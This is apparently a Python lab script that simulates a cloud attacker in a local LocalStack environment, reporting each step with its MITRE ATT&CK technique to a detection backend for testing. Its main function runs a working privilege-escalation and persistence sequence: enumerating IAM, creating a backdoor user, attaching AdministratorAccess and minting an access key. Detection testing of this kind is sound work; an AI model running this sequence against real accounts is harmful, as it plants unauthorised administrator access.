"""
AEGIS-ATK-002: Privilege Escalation and Persistence

Simulates an attacker who already holds the access keys of the IAM user
"test-analyst". After a short look around, it creates a new backdoor user,
gives it administrator rights and mints an access key for it, so it keeps
control even if the original key is revoked. Every API call is reported to the
AegisCloud backend, labelled with the MITRE ATT&CK technique it represents.

NOTE: the free LocalStack edition does not enforce IAM, so every call succeeds.
Detection therefore relies on the pattern (IAM changes made by an identity that
should not make them), not on denials.

Lab use only: everything targets the local LocalStack environment.
Place this file at: attack-simulator/privilege-escalation/scenario.py
"""
import json
import os
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import boto3
import requests
from botocore.exceptions import ClientError

ENDPOINT = "http://localhost:4566"           # LocalStack
BACKEND = "http://localhost:8000/api/events"  # AegisCloud FastAPI backend
REGION = "us-east-1"

ATTACK_ID = "AEGIS-ATK-002"
VICTIM_USER = "test-analyst"
BACKDOOR_USER = "svc-backup-admin"
ADMIN_POLICY_ARN = "arn:aws:iam::aws:policy/AdministratorAccess"
# Reserved documentation range (RFC 5737), different from scenario 1 so the
# two attacks become two separate incidents.
SIMULATED_SOURCE_IP = "198.51.100.77"

DENIED_CODES = {
    "AccessDenied", "AccessDeniedException",
    "UnauthorizedOperation", "UnauthorizedAccess",
}

ROOT = Path(__file__).resolve().parents[2]
TECHNIQUES = json.loads(
    (ROOT / "mitre" / "techniques.json").read_text(encoding="utf-8-sig")
)

# Calls that change the cloud account are more serious than read-only calls.
WRITE_ACTIONS = {"iam:CreateUser", "iam:AttachUserPolicy", "iam:CreateAccessKey"}


def load_credentials():
    key = os.environ.get("AEGIS_ACCESS_KEY")
    secret = os.environ.get("AEGIS_SECRET_KEY")
    if not key or not secret:
        sys.exit("Set AEGIS_ACCESS_KEY and AEGIS_SECRET_KEY first (see the README steps).")
    return key, secret


def make_client(service, key, secret):
    return boto3.client(
        service, endpoint_url=ENDPOINT, region_name=REGION,
        aws_access_key_id=key, aws_secret_access_key=secret,
    )


def cleanup_backdoor():
    """Remove the backdoor user from a previous run (lab admin credentials, not reported)."""
    iam = make_client("iam", "test", "test")
    try:
        for k in iam.list_access_keys(UserName=BACKDOOR_USER)["AccessKeyMetadata"]:
            iam.delete_access_key(UserName=BACKDOOR_USER, AccessKeyId=k["AccessKeyId"])
        for p in iam.list_attached_user_policies(UserName=BACKDOOR_USER)["AttachedPolicies"]:
            iam.detach_user_policy(UserName=BACKDOOR_USER, PolicyArn=p["PolicyArn"])
        iam.delete_user(UserName=BACKDOOR_USER)
        print(f"(cleanup: removed leftover user '{BACKDOOR_USER}' from a previous run)")
    except ClientError:
        pass  # nothing to clean up


def report(technique_id, action, resource, result, error_code):
    """Send one telemetry event to the backend (our stand-in for CloudTrail)."""
    tech = TECHNIQUES[technique_id]
    if result != "allowed":
        severity = "medium"
    else:
        severity = "medium" if action in WRITE_ACTIONS else "low"
    event = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "hostname": "attacker-workstation",
        "event_type": "cloud_api_call",
        "user": VICTIM_USER,
        "source_ip": SIMULATED_SOURCE_IP,
        "severity": severity,
        "description": f"{action} on {resource}: {result}",
        "api_action": action,
        "resource": resource,
        "result": result,
        "error_code": error_code,
        "attack_id": ATTACK_ID,
        "expected_technique": technique_id,
        "expected_technique_name": tech["name"],
        "expected_tactics": tech["tactics"],
    }
    try:
        requests.post(BACKEND, json=[event], timeout=5).raise_for_status()
    except requests.RequestException as exc:
        print(f"    (warning: could not report to backend: {exc})")


def attempt(step, technique_id, action, resource, call):
    """Run one API call, classify the outcome, report it, then pause briefly."""
    tech = TECHNIQUES[technique_id]
    print(f"\n[{step}] {tech['name']} ({technique_id})")
    print(f"    {action} on {resource}")
    error_code = None
    try:
        call()
        result = "allowed"
    except ClientError as exc:
        error_code = exc.response["Error"]["Code"]
        result = "denied" if error_code in DENIED_CODES else "error"
    print(f"    -> {result.upper()}" + (f" ({error_code})" if error_code else ""))
    report(technique_id, action, resource, result, error_code)
    time.sleep(1)
    return result


def main():
    key, secret = load_credentials()
    cleanup_backdoor()
    sts = make_client("sts", key, secret)
    iam = make_client("iam", key, secret)

    print(f"=== {ATTACK_ID}: Privilege Escalation as '{VICTIM_USER}' ===")

    results = [
        attempt(1, "T1078.004", "sts:GetCallerIdentity", "*",
                lambda: sts.get_caller_identity()),
        attempt(2, "T1087.004", "iam:ListUsers", "*",
                lambda: iam.list_users()),
        attempt(3, "T1069.003", "iam:ListGroups", "*",
                lambda: iam.list_groups()),
        attempt(4, "T1136.003", "iam:CreateUser", BACKDOOR_USER,
                lambda: iam.create_user(UserName=BACKDOOR_USER)),
        attempt(5, "T1098.003", "iam:AttachUserPolicy", BACKDOOR_USER,
                lambda: iam.attach_user_policy(UserName=BACKDOOR_USER,
                                               PolicyArn=ADMIN_POLICY_ARN)),
        attempt(6, "T1098.001", "iam:CreateAccessKey", BACKDOOR_USER,
                lambda: iam.create_access_key(UserName=BACKDOOR_USER)),
    ]

    print(
        f"\n=== Done: {results.count('allowed')} allowed, "
        f"{results.count('denied')} denied, {results.count('error')} errors ==="
    )


if __name__ == "__main__":
    main()
